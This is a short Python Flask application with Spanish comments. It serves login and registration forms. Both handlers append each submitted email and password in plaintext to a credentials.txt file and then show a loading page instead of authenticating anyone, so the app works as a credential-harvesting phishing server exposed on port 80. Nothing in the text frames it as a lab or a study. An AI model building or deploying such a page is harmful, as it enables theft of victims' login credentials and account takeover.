from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def index():
    # Podrías redirigir directamente a /login, o mostrar otra cosa
    return render_template("login.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        # Mostrar formulario login
        return render_template("login.html")

    # Procesar POST login
    email = request.form["email"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"LOGIN - {email}:{password}\n")
    
    # Mostrar pantalla de "Cargando..." (éste es el template que veremos abajo)
    return render_template("success.html")

@app.route("/registro")
def registro():
    return render_template("register.html")

@app.route("/register", methods=["POST"])
def register():
    email = request.form["email"]
    password = request.form["password"]
    
    with open("credentials.txt", "a") as f:
        f.write(f"REGISTRO - {email}:{password}\n")
    
    return render_template("success.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
